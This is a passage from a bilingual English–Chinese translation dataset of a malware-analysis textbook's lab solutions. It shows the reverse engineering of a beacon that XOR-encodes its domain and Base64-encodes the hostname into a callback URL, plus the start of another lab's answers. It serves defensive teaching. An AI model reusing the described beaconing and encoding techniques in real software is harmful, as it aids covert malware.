  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 134](index-641_1.png)'
  id: totrans-4148
  prefs: []
  type: TYPE_IMG
  zh: '![Image 134](index-641_1.png)'
- en: Looking at the strings, we see Mozilla/4.0, but the strings aG9zdG5hbWUtZm9v
    and www.practicalmalwareanalysis.com (bolded in Listing 13-1L) are not found.
  id: totrans-4149
  prefs: []
  type: TYPE_NORMAL
  zh: 观察字符串，我们看到 Mozilla/4.0，但字符串 aG9zdG5hbWUtZm9v 和 www.practicalmalwareanalysis.com（在列表
    13-1L 中加粗）没有找到。
- en: Therefore, we can assume that these strings might be encoded by the malware.
  id: totrans-4150
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，我们可以假设这些字符串可能被恶意软件编码。
- en: '**NOTE**'
  id: totrans-4151
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*The aG9zdG5hbWUtZm9v string is based on the hostname, so you will likely have
    a different string in your listing. Also, Windows networking libraries provide
    some elements of* *the network beacon, such as GET, HTTP/1.1, User-Agent, and
    Host. Thus, we don’t* *expect to find these elements in the malware itself.*'
  id: totrans-4152
  prefs: []
  type: TYPE_NORMAL
  zh: '*基于主机名的 aG9zdG5hbWUtZm9v 字符串，因此你列表中的字符串可能不同。此外，Windows 网络库提供了一些网络信标元素，例如 GET、HTTP/1.1、User-Agent
    和 Host。因此，我们* *不* *期望在恶意软件本身中找到这些元素。*'
- en: Next, we use static analysis to search the malware for evidence of encoding
    techniques. Searching for all instances of nonzeroing xor instructions in IDA
    Pro, we find three examples, but two of them (at 0x00402BE2 and 0x00402BE6) are
    identified as library code, which is why the search window does not list the function
    names. This code can be ignored, leaving just the xor eax,3Bh instruction.
  id: totrans-4153
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用静态分析在恶意软件中搜索编码技术的证据。在 IDA Pro 中搜索所有非零 XOR 指令的实例，我们找到了三个例子，但其中两个（在 0x00402BE2
    和 0x00402BE6）被识别为库代码，这就是为什么搜索窗口没有列出函数名称。可以忽略此代码，仅留下 xor eax,3Bh 指令。
- en: The xor eax,3Bh instruction is contained in sub_401190, as shown in Figure 13-1L.
  id: totrans-4154
  prefs: []
  type: TYPE_NORMAL
  zh: 如图 13-1L 所示，xor eax,3Bh 指令包含在 sub_401190 中。
- en: '*Figure 13-1L: Single-byte XOR loop with 0x3B*'
  id: totrans-4155
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 13-1L：使用 0x3B 的单字节 XOR 循环*'
- en: '*in sub_401190*'
  id: totrans-4156
  prefs: []
  type: TYPE_NORMAL
  zh: '*在 sub_401190 中*'
- en: Figure 13-1L contains a small loop that appears to increment a counter (var_4)
    and modify the contents of a buffer (arg_0) by XOR’ing the original contents with
    0x3B. The other argument (arg_4) is the length of the buffer that should be XOR’ed.
    The simple function sub_401190, which we’ll rename xorEncode, implements a single-byte
    XOR encoding with the static byte 0x3B, taking the buffer and length as arguments.
  id: totrans-4157
  prefs: []
  type: TYPE_NORMAL
  zh: 图 13-1L 包含一个看似增加计数器（var_4）并修改缓冲区（arg_0）内容（通过 XOR 原始内容与 0x3B）的小循环。另一个参数（arg_4）是应该
    XOR 的缓冲区长度。我们将简单的函数 sub_401190 重命名为 xorEncode，它实现了一个单字节 XOR 编码，使用静态字节 0x3B，以缓冲区和长度作为参数。
- en: '**608**'
  id: totrans-4158
  prefs: []
  type: TYPE_NORMAL
  zh: '**608**'
- en: Appendix C
  id: totrans-4159
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4160
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 135](index-642_1.png)'
  id: totrans-4161
  prefs: []
  type: TYPE_IMG
  zh: '![Image 135](index-642_1.png)'
- en: Next, let’s identify the content affected by xorEncode. The function sub_401300
    is the only one that calls xorEncode. Tracing its code blocks that precede the
    call to xorEncode, we see (in order) calls to GetModuleHandleA, FindResourceA,
    SizeofResource, GlobalAlloc, LoadResource, and LockResource. The malware is doing
    something with a resource just prior to calling xorEncode.
  id: totrans-4162
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，让我们确定受 xorEncode 影响的内容。sub_401300 是唯一调用 xorEncode 的函数。跟踪其调用 xorEncode 之前的代码块，我们看到（按顺序）调用
    GetModuleHandleA、FindResourceA、SizeofResource、GlobalAlloc、LoadResource 和 LockResource。在调用
    xorEncode 之前，恶意软件正在对某个资源进行操作。
- en: Of these resource-related functions, the function that will point us to the
    resource that we should investigate is FindResourceA.
  id: totrans-4163
  prefs: []
  type: TYPE_NORMAL
  zh: 在这些与资源相关的函数中，将指向我们应该调查的资源的是 FindResourceA 函数。
- en: Listing 13-2L shows the FindResourceA function at .
  id: totrans-4164
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 13-2L 显示了 FindResourceA 函数。
- en: push 0Ah ; lpType
  id: totrans-4165
  prefs: []
  type: TYPE_NORMAL
  zh: push 0Ah ; lpType
- en: push 101 ; lpName
  id: totrans-4166
  prefs: []
  type: TYPE_NORMAL
  zh: push 101 ; lpName
- en: mov eax, [ebp+hModule]
  id: totrans-4167
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, [ebp+hModule]
- en: push eax ; hModule
  id: totrans-4168
  prefs: []
  type: TYPE_NORMAL
  zh: push eax ; hModule
- en: call ds:FindResourceA 
  id: totrans-4169
  prefs: []
  type: TYPE_NORMAL
  zh: call ds:FindResourceA 
- en: mov [ebp+hResInfo], eax
  id: totrans-4170
  prefs: []
  type: TYPE_NORMAL
  zh: mov [ebp+hResInfo], eax
- en: cmp [ebp+hResInfo], 0
  id: totrans-4171
  prefs: []
  type: TYPE_NORMAL
  zh: cmp [ebp+hResInfo], 0
- en: jnz short loc_401357
  id: totrans-4172
  prefs: []
  type: TYPE_NORMAL
  zh: jnz short loc_401357
- en: '*Listing 13-2L: Call to FindResourceA*'
  id: totrans-4173
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 13-2L：对 FindResourceA 的调用*'
- en: IDA Pro has labeled the parameters for us. The lpType is 0xA, which designates
    the resource data as application-defined, or raw data. The lpName parameter can
    be either a name or an index number. In this case, it is an index number. Since
    the function references a resource with an ID of 101, we look up the resource
    in the PE file with PEview and find an RCDATA resource with the index of 101 (0x65),
    with a resource 32 bytes long at offset 0x7060\.
  id: totrans-4174
  prefs: []
  type: TYPE_NORMAL
  zh: IDA Pro 已经为我们标记了参数。lpType 是 0xA，表示资源数据为应用程序定义的或原始数据。lpName 参数可以是名称或索引号。在这种情况下，它是一个索引号。由于函数引用了一个
    ID 为 101 的资源，我们使用 PEview 在 PE 文件中查找索引为 101 (0x65) 的 RCDATA 资源，资源长度为 32 字节，偏移量为
    0x7060。
- en: We open the executable in WinHex and highlight bytes 7060 through 7080\.
  id: totrans-4175
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在 WinHex 中打开可执行文件，并突出显示字节 7060 到 7080。
- en: '**1 3**'
  id: totrans-4176
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 3**'
- en: Then we choose **Edit****Modify Data**, select **XOR**, and enter **3B**. Figure
    13-2L
  id: totrans-4177
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，我们选择 **编辑****修改数据**，选择 **XOR**，并输入 **3B**。图 13-2L
- en: shows the result.
  id: totrans-4178
  prefs: []
  type: TYPE_NORMAL
  zh: 显示结果。
- en: '*Figure 13-2L: Resource obfuscated with single-byte XOR encoding* The top portion
    of Figure 13-2L shows the original version of the data, and the bottom portion
    shows the effect of applying XOR with 0x3B'
  id: totrans-4179
  prefs: []
  type: TYPE_NORMAL
  zh: '*图13-2L：使用单字节XOR编码的资源* 图13-2L的上半部分显示了数据的原始版本，下半部分显示了应用0x3B XOR后的效果。'
- en: to each byte. The figure clearly shows that the resource stores the string www.practicalmalwareanalysis.com
    in encoded form.
  id: totrans-4180
  prefs: []
  type: TYPE_NORMAL
  zh: 将每个字节转换为字节。图示清楚地显示资源以编码形式存储字符串www.practicalmalwareanalysis.com。
- en: Of the two strings that we suspected might be encoded, we’ve found the domain,
    but not the GET request string (aG9zdG5hbWUtZm9v in our example). To find the
    GET string, we’ll use PEiD’s KANAL plug-in, which identifies a Base64
  id: totrans-4181
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们怀疑可能被编码的两个字符串中，我们找到了域名，但没有找到GET请求字符串（在我们的示例中为aG9zdG5hbWUtZm9v）。为了找到GET字符串，我们将使用PEiD的KANAL插件，该插件识别Base64编码。
- en: table at 0x004050E8\. Listing 13-3L shows the output of the KANAL plug-in.
  id: totrans-4182
  prefs: []
  type: TYPE_NORMAL
  zh: 表位于0x004050E8。列表13-3L显示了KANAL插件的输出。
- en: Solutions to Labs
  id: totrans-4183
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**609**'
  id: totrans-4184
  prefs: []
  type: TYPE_NORMAL
  zh: '**609**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4185
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 136](index-643_1.png)'
  id: totrans-4186
  prefs: []
  type: TYPE_IMG
  zh: '![Image 136](index-643_1.png)'
- en: 'BASE64 table :: 000050E8 :: 004050E8 '
  id: totrans-4187
  prefs: []
  type: TYPE_NORMAL
  zh: 'BASE64表 :: 000050E8 :: 004050E8'
- en: Referenced at 00401013
  id: totrans-4188
  prefs: []
  type: TYPE_NORMAL
  zh: 在00401013处引用
- en: Referenced at 0040103E
  id: totrans-4189
  prefs: []
  type: TYPE_NORMAL
  zh: 在0040103E处引用
- en: Referenced at 0040106E
  id: totrans-4190
  prefs: []
  type: TYPE_NORMAL
  zh: 在0040106E处引用
- en: Referenced at 00401097
  id: totrans-4191
  prefs: []
  type: TYPE_NORMAL
  zh: 在00401097处引用
- en: '*Listing 13-3L: PEiD KANAL output*'
  id: totrans-4192
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表13-3L：PEiD KANAL输出*'
- en: Navigating to this Base64 table, we see that it is the standard Base64
  id: totrans-4193
  prefs: []
  type: TYPE_NORMAL
  zh: 导航到这个Base64表，我们看到它是标准的Base64
- en: 'string: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/. This
    string has four cross-references in IDA Pro, all in one function that starts at
    0x00401000, so we’ll refer to this function as base64index. Figure 13-3L shows
    one of the code blocks in this function.'
  id: totrans-4194
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/. 这个字符串在IDA
    Pro中有四个交叉引用，所有这些交叉引用都在从0x00401000开始的同一个函数中，因此我们将此函数称为base64index。图13-3L显示了该函数中的一个代码块。
- en: '*Figure 13-3L: Base64 padding*'
  id: totrans-4195
  prefs: []
  type: TYPE_NORMAL
  zh: '*图13-3L：Base64填充*'
- en: As you can see, a fork references an = character in the box on the right side
    of Figure 13-3L. This supports the conclusion that base64index is related to Base64
    encoding, because = is used for padding in Base64 encoding.
  id: totrans-4196
  prefs: []
  type: TYPE_NORMAL
  zh: 如您所见，一个分支引用了图13-3L右侧框中的等号（=）字符。这支持了base64index与Base64编码相关的结论，因为在Base64编码中，等号用于填充。
- en: The function that calls base64index is the real base64_encode function located
    at 0x004010B1\. Its purpose is to divide the source string into a 3-byte block,
    and to pass each to base64index to encode the 3 bytes into a 4-byte one.
  id: totrans-4197
  prefs: []
  type: TYPE_NORMAL
  zh: 调用base64index的函数是位于0x004010B1的真实base64_encode函数。其目的是将源字符串分成3字节块，并将每个块传递给base64index以将其编码为4字节。
- en: Some of the clues that make this apparent are the use of strlen at the beginning
    of the function to find the length of the source string, the comparison with the
    number 3 (cmp [ebp+var_14], 3) at the start of the outer loop (code block loc_401100),
    and the comparison with the number 4 (cmp [ebp+var_14], 4) at the start of the
    inner write loop that occurs after base64index has returned results. We conclude
    that base64_encode is the main Base64-encoding function that takes as arguments
    a source string and destination buffer to perform Base64 translation.
  id: totrans-4198
  prefs: []
  type: TYPE_NORMAL
  zh: 一些使这一点显而易见的线索包括在函数开始时使用strlen来查找源字符串的长度，以及在代码块loc_401100的外层循环开始时与数字3的比较（cmp
    [ebp+var_14], 3），以及在base64index返回结果后发生的内层写入循环开始时与数字4的比较（cmp [ebp+var_14], 4）。我们得出结论，base64_encode是主要的Base64编码函数，它接受源字符串和目标缓冲区作为参数以执行Base64转换。
- en: Using IDA Pro, we find that there is only one cross-reference to base64_encode
    (0x004000B1), which is in a function at 0x004011C9 that we will refer to as beacon.
    The call to base64_encode is shown in Listing 13-4L at .
  id: totrans-4199
  prefs: []
  type: TYPE_NORMAL
  zh: 使用IDA Pro，我们发现只有一个对base64_encode（0x004000B1）的交叉引用，它位于0x004011C9处的函数中，我们将此函数称为信标。base64_encode的调用在列表13-4L中显示。
- en: 004011FA lea edx, [ebp+hostname]
  id: totrans-4200
  prefs: []
  type: TYPE_NORMAL
  zh: 004011FA 将[ebp+hostname]的地址加载到[edx]寄存器
- en: 00401200 push edx ; name
  id: totrans-4201
  prefs: []
  type: TYPE_NORMAL
  zh: 00401200 将[edx]压入栈中；名称
- en: 00401201 call gethostname 
  id: totrans-4202
  prefs: []
  type: TYPE_NORMAL
  zh: 00401201 调用gethostname
- en: 00401206 mov [ebp+var_4], eax
  id: totrans-4203
  prefs: []
  type: TYPE_NORMAL
  zh: 00401206 将[eax]寄存器的值移动到[ebp+var_4]
- en: 00401209 push 12  ; Count
  id: totrans-4204
  prefs: []
  type: TYPE_NORMAL
  zh: 00401209 将12压入栈中；计数
- en: 0040120B lea eax, [ebp+hostname]
  id: totrans-4205
  prefs: []
  type: TYPE_NORMAL
  zh: 0040120B 将[ebp+hostname]的地址加载到[eax]寄存器
- en: 00401211 push eax ; Source **610**
  id: totrans-4206
  prefs: []
  type: TYPE_NORMAL
  zh: 00401211 将[eax]压入栈中；源 **610**
- en: Appendix C
  id: totrans-4207
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4208
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00401212 lea ecx, [ebp+Src]
  id: totrans-4209
  prefs: []
  type: TYPE_NORMAL
  zh: 00401212 将[ebp+Src]的地址加载到[ecx]寄存器
- en: 00401215 push ecx ; Dest
  id: totrans-4210
  prefs: []
  type: TYPE_NORMAL
  zh: 00401215 将[ecx]压入栈中；目标
- en: 00401216 call strncpy 
  id: totrans-4211
  prefs: []
  type: TYPE_NORMAL
  zh: 00401216 调用strncpy
- en: 0040121B add esp, 0Ch
  id: totrans-4212
  prefs: []
  type: TYPE_NORMAL
  zh: 0040121B 将[esp]增加0Ch
- en: 0040121E mov [ebp+var_C], 0
  id: totrans-4213
  prefs: []
  type: TYPE_NORMAL
  zh: 0040121E 将[ebp+var_C]设置为0
- en: 00401222 lea edx, [ebp+Dst]
  id: totrans-4214
  prefs: []
  type: TYPE_NORMAL
  zh: 00401222 将[ebp+Dst]的地址加载到[edx]寄存器
- en: 00401225 push edx ; int
  id: totrans-4215
  prefs: []
  type: TYPE_NORMAL
  zh: 00401225 将[edx]压入栈中；int
- en: 00401226 lea eax, [ebp+Src]
  id: totrans-4216
  prefs: []
  type: TYPE_NORMAL
  zh: 00401226 lea eax, [ebp+Src]
- en: 00401229 push eax ; Str
  id: totrans-4217
  prefs: []
  type: TYPE_NORMAL
  zh: 00401229 push eax ; Str
- en: 0040122A call base64_encode 
  id: totrans-4218
  prefs: []
  type: TYPE_NORMAL
  zh: 0040122A call base64_encode 
- en: 0040122F add esp, 8
  id: totrans-4219
  prefs: []
  type: TYPE_NORMAL
  zh: 0040122F add esp, 8
- en: 00401232 mov byte ptr [ebp+var_23+3], 0
  id: totrans-4220
  prefs: []
  type: TYPE_NORMAL
  zh: 00401232 mov byte ptr [ebp+var_23+3], 0
- en: 00401236 lea ecx, [ebp+Dst]
  id: totrans-4221
  prefs: []
  type: TYPE_NORMAL
  zh: 00401236 lea ecx, [ebp+Dst]
- en: 00401239 push ecx
  id: totrans-4222
  prefs: []
  type: TYPE_NORMAL
  zh: 00401239 push ecx
- en: 0040123A mov edx, [ebp+arg_0]
  id: totrans-4223
  prefs: []
  type: TYPE_NORMAL
  zh: 0040123A mov edx, [ebp+arg_0]
- en: 0040123D push edx
  id: totrans-4224
  prefs: []
  type: TYPE_NORMAL
  zh: 0040123D push edx
- en: 0040123E push offset aHttpSS ; http://%s/%s/ 
  id: totrans-4225
  prefs: []
  type: TYPE_NORMAL
  zh: 0040123E push offset aHttpSS ; http://%s/%s/ 
- en: 00401243 lea eax, [ebp+szUrl]
  id: totrans-4226
  prefs: []
  type: TYPE_NORMAL
  zh: 00401243 lea eax, [ebp+szUrl]
- en: 00401249 push eax ; Dest
  id: totrans-4227
  prefs: []
  type: TYPE_NORMAL
  zh: 00401249 push eax ; Dest
- en: 0040124A call sprintf
  id: totrans-4228
  prefs: []
  type: TYPE_NORMAL
  zh: 0040124A call sprintf
- en: '*Listing 13-4L: Identifying Base64 encoding in a URL*'
  id: totrans-4229
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 13-4L：在 URL 中识别 Base64 编码*'
- en: Looking at the destination string that is passed to base64_encode, we see that
    it is pushed onto the stack as the fourth argument to sprintf at . Specifically,
    the second string in the format string http://%s/%s/ at  is the path of the URI.
    This is consistent with the beacon string we identified earlier as aG9zdG5hbWUtZm9v.
  id: totrans-4230
  prefs: []
  type: TYPE_NORMAL
  zh: 查看传递给 base64_encode 的目标字符串，我们看到它作为 sprintf 的第四个参数压入堆栈。具体来说，格式字符串 http://%s/%s/
    中的第二个字符串是 URI 的路径。这与我们之前识别的信标字符串 aG9zdG5hbWUtZm9v 一致。
- en: '**1 3**'
  id: totrans-4231
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 3**'
- en: Next, we follow the source string passed to base64_encode and see that it is
    the output of the strncpy function located at , and that the input to the strncpy
    function is the output of a call to gethostname at . Thus, we know that the source
    of the encoded URI path is the hostname. The strncpy function copies only the
    first 12 bytes of the hostname, as seen at .
  id: totrans-4232
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们跟踪传递给 base64_encode 的源字符串，我们看到它是位于处的 strncpy 函数的输出，而 strncpy 函数的输入是 gethostname
    函数的输出。因此，我们知道编码 URI 路径的来源是主机名。如所示，strncpy 函数只复制主机名的第一个 12 个字节。
- en: '**NOTE**'
  id: totrans-4233
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*The Base64 string that represents the encoding of the hostname will never
    be longer* *than 16 characters because 12 characters × 4/3 expansion for Base64
    = 16\. It is still* *possible to see the = character as padding at the end of
    the string, but this will occur* *only when the hostname is less than 12 characters
    and the length of the hostname is not* *evenly divisible by 3\.*'
  id: totrans-4234
  prefs: []
  type: TYPE_NORMAL
  zh: '*表示主机名编码的 Base64 字符串永远不会超过 16 个字符，因为 12 个字符 × 4/3 的 Base64 扩展 = 16。仍然可以看到字符串末尾的
    = 字符作为填充，但这只会发生在主机名少于 12 个字符且主机名长度不能被 3 整除的情况下。*'
- en: Looking at the remaining code in beacon, we see that it uses WinINet (InternetOpenA,
    InternetOpenUrlA, and InternetReadFile) to open and read the URL composed in Listing
    13-4L. The first character of the returned data is compared with the letter o.
    If the first character is o, then beacon returns 1; otherwise, it returns 0\.
    The main function is composed of a single loop with calls to Sleep and beacon.
    When beacon (0x004011C9) returns true (by getting a web response starting with
    o), the loop exits and the program ends.
  id: totrans-4235
  prefs: []
  type: TYPE_NORMAL
  zh: 查看信标中的剩余代码，我们看到它使用 WinINet（InternetOpenA、InternetOpenUrlA 和 InternetReadFile）打开和读取在列表
    13-4L 中组成的 URL。返回数据的第一个字符与字母 o 进行比较。如果第一个字符是 o，则信标返回 1；否则，它返回 0。主函数由一个循环组成，该循环调用
    Sleep 和信标。当信标（0x004011C9）返回 true（通过获取以 o 开头的网页响应）时，循环退出，程序结束。
- en: To summarize, this malware is a beacon to let the attacker know that it is running.
    The malware sends out a regular beacon with an encoded (and possibly truncated)
    hostname identifier, and when it receives a specific response, it terminates.
  id: totrans-4236
  prefs: []
  type: TYPE_NORMAL
  zh: 总结来说，这种恶意软件是一个信标，让攻击者知道它在运行。恶意软件发送一个常规信标，其中包含编码（可能截断）的主机名标识符，并在接收到特定响应时终止。
- en: Solutions to Labs
  id: totrans-4237
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**611**'
  id: totrans-4238
  prefs: []
  type: TYPE_NORMAL
  zh: '**611**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4239
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Lab 13-2 Solutions**'
  id: totrans-4240
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验室 13-2 解决方案**'
- en: '***Short Answers***'
  id: totrans-4241
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-4242
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: '*Lab13-02.exe* creates large, seemingly random files in its current directory
    with names that start with *temp* and end with eight hexadecimal digits that vary
    for each file.'
  id: totrans-4243
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab13-02.exe* 在其当前目录中创建大型的、看似随机的文件，文件名以 *temp* 开头，以八个十六进制数字结尾，每个文件都不同。'
- en: 2\.
  id: totrans-4244
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The XOR search technique identifies potential encoding-related functions at
    sub_401570 and sub_401739\. The other three techniques suggested find nothing.
  id: totrans-4245
  prefs: []
  type: TYPE_NORMAL
  zh: XOR 搜索技术在 sub_401570 和 sub_401739 处识别了潜在的编码相关函数。其他三种建议的技术没有找到任何结果。
- en: 3\.
  id: totrans-4246
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The encoding functions might be found just before the call to WriteFile.
  id: totrans-4247
  prefs: []
  type: TYPE_NORMAL
  zh: 编码函数可能位于调用 WriteFile 之前。
- en: 4\.
  id: totrans-4248
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The encoding function is sub_40181F.
  id: totrans-4249
  prefs: []
  type: TYPE_NORMAL
  zh: 编码函数是 sub_40181F。
- en: 5\.
  id: totrans-4250
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: The source content is a screen capture.
  id: totrans-4251
  prefs: []
  type: TYPE_NORMAL
  zh: 源内容是屏幕截图。
- en: 6\.
  id: totrans-4252
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: The algorithm is nonstandard and not easily determined, so the easiest way to
    decode traffic is via instrumentation.
  id: totrans-4253
  prefs: []
  type: TYPE_NORMAL
  zh: 算法是非标准的，不容易确定，因此解码流量的最简单方法是使用仪器。
- en: 7\.
  id: totrans-4254
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: See the detailed analysis for how to recover the original source of an encoded
    file.
  id: totrans-4255
  prefs: []
  type: TYPE_NORMAL
  zh: 请参阅如何恢复编码文件原始源代码的详细分析。
- en: '***Detailed Analysis***'
  id: totrans-4256
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We launch the malware and see that it creates new files at a regular interval
    in its current directory. These files are fairly large (multiple megabytes) and
    contain seemingly random data with filenames that start with *temp* and end with
    some random-looking characters, something like the ones shown in Listing 13-5L.
  id: totrans-4257
  prefs: []
  type: TYPE_NORMAL
  zh: 我们启动恶意软件，看到它在当前目录中以固定间隔创建新文件。这些文件相当大（多个兆字节），包含看似随机的数据，文件名以 *temp* 开头，以一些看起来随机的字符结尾，类似于列表
    13-5L 中显示的。
- en: temp062da212
  id: totrans-4258
  prefs: []
  type: TYPE_NORMAL
  zh: temp062da212
- en: temp062dcb25
  id: totrans-4259
  prefs: []
  type: TYPE_NORMAL
  zh: temp062dcb25
- en: temp062df572
  id: totrans-4260
  prefs: []
  type: TYPE_NORMAL
  zh: temp062df572
- en: temp062e1f50
  id: totrans-4261
  prefs: []
  type: TYPE_NORMAL
  zh: temp062e1f50
- en: temp062e491f
  id: totrans-4262
  prefs: []
  type: TYPE_NORMAL
  zh: temp062e491f
- en: '*Listing 13-5L: Example filenames created by* Lab13-02.exe Next, we search
    the malware for evidence of encoding techniques using static analysis. The PEiD
    KANAL plug-in, FindCrypt2 plug-in for IDA Pro, and IDA Entropy Plugin fail to
    find anything of interest. However, a search for xor instructions yields the results
    shown in Table 13-1L.'
  id: totrans-4263
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 13-5L：由 *Lab13-02.exe* 创建的示例文件名* 下一步，我们使用静态分析在恶意软件中搜索编码技术的证据。PEiD KANAL
    插件、IDA Pro 的 FindCrypt2 插件和 IDA Entropy 插件未能找到任何有趣的内容。然而，对 xor 指令的搜索结果显示在表 13-1L
    中。'
- en: '**Table 13-1L:** The xor Instructions Found in *Lab13-02.exe* **Address**'
  id: totrans-4264
  prefs: []
  type: TYPE_NORMAL
  zh: '**表 13-1L：在 *Lab13-02.exe* 中找到的 xor 指令 **地址**'
- en: '**Function**'
  id: totrans-4265
  prefs: []
  type: TYPE_NORMAL
  zh: '**函数**'
- en: '**Instruction**'
  id: totrans-4266
  prefs: []
  type: TYPE_NORMAL
  zh: '**指令**'
- en: '00401040'
  id: totrans-4267
  prefs: []
  type: TYPE_NORMAL
  zh: '00401040'
- en: sub_401000
  id: totrans-4268
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401000
- en: xor eax, eax 
  id: totrans-4269
  prefs: []
  type: TYPE_NORMAL
  zh: xor eax, eax 
- en: 004012D6
  id: totrans-4270
  prefs: []
  type: TYPE_NORMAL
  zh: 004012D6
- en: sub_40128D 
  id: totrans-4271
  prefs: []
  type: TYPE_NORMAL
  zh: sub_40128D 
- en: xor eax, [ebp+var_10]
  id: totrans-4272
  prefs: []
  type: TYPE_NORMAL
  zh: xor eax, [ebp+var_10]
- en: 0040171F
  id: totrans-4273
  prefs: []
  type: TYPE_NORMAL
  zh: 0040171F
- en: 
  id: totrans-4274
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: xor eax, [esi+edx*4]
  id: totrans-4275
  prefs: []
  type: TYPE_NORMAL
  zh: xor eax, [esi+edx*4]
- en: 0040176F
  id: totrans-4276
  prefs: []
  type: TYPE_NORMAL
  zh: 0040176F
- en: sub_401739 
  id: totrans-4277
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739 
- en: xor edx, [ecx]
  id: totrans-4278
  prefs: []
  type: TYPE_NORMAL
  zh: xor edx, [ecx]
- en: 0040177A
  id: totrans-4279
  prefs: []
  type: TYPE_NORMAL
  zh: 0040177A
- en: sub_401739
  id: totrans-4280
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739
- en: xor edx, ecx
  id: totrans-4281
  prefs: []
  type: TYPE_NORMAL
  zh: xor edx, ecx
- en: '**612**'
  id: totrans-4282
  prefs: []
  type: TYPE_NORMAL
  zh: '**612**'
- en: Appendix C
  id: totrans-4283
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4284
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 137](index-646_1.png)'
  id: totrans-4285
  prefs: []
  type: TYPE_IMG
  zh: '![Image 137](index-646_1.png)'
- en: '**Table 13-1L:** The xor Instructions Found in *Lab13-02.exe* (continued) **Address**'
  id: totrans-4286
  prefs: []
  type: TYPE_NORMAL
  zh: '**表 13-1L：在 *Lab13-02.exe* 中找到的 xor 指令（续）**地址'
- en: '**Function**'
  id: totrans-4287
  prefs: []
  type: TYPE_NORMAL
  zh: '**函数**'
- en: '**Instruction**'
  id: totrans-4288
  prefs: []
  type: TYPE_NORMAL
  zh: '**指令**'
- en: 00401785
  id: totrans-4289
  prefs: []
  type: TYPE_NORMAL
  zh: 00401785
- en: sub_401739
  id: totrans-4290
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739
- en: xor edx, ecx
  id: totrans-4291
  prefs: []
  type: TYPE_NORMAL
  zh: xor edx, ecx
- en: 00401795
  id: totrans-4292
  prefs: []
  type: TYPE_NORMAL
  zh: 00401795
- en: sub_401739
  id: totrans-4293
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739
- en: xor eax, [edx+8]
  id: totrans-4294
  prefs: []
  type: TYPE_NORMAL
  zh: xor eax, [edx+8]
- en: 004017A1
  id: totrans-4295
  prefs: []
  type: TYPE_NORMAL
  zh: 004017A1
- en: sub_401739
  id: totrans-4296
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739
- en: xor eax, edx
  id: totrans-4297
  prefs: []
  type: TYPE_NORMAL
  zh: xor eax, edx
- en: 004017AC
  id: totrans-4298
  prefs: []
  type: TYPE_NORMAL
  zh: 004017AC
- en: sub_401739
  id: totrans-4299
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739
- en: xor eax, edx
  id: totrans-4300
  prefs: []
  type: TYPE_NORMAL
  zh: xor eax, edx
- en: 004017BD
  id: totrans-4301
  prefs: []
  type: TYPE_NORMAL
  zh: 004017BD
- en: sub_401739
  id: totrans-4302
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739
- en: xor ecx, [eax+10h]
  id: totrans-4303
  prefs: []
